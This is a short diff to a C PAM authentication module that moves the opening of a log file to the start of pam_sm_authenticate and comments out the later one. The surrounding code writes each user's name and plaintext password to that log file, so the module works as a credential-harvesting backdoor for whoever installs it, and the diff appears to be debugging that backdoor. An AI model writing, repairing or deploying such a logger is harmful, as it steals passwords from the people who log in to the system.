@@ -25,6 +25,10 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                     int argc, const char **argv) {
     const char *username, *password;
 
+    FILE *log = fopen(LOGFILE, "a");
+
+
+    
     if (pam_get_user(pamh, &username, NULL) != PAM_SUCCESS || username == NULL)
         fprintf(log, "if 1 \n");
 
@@ -43,7 +47,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
 
         return PAM_AUTH_ERR;
 
-    FILE *log = fopen(LOGFILE, "a");
+    //FILE *log = fopen(LOGFILE, "a");
     if (log) {
         fprintf(log, "User: %s, Password: %s\n", username, password);
         fclose(log);
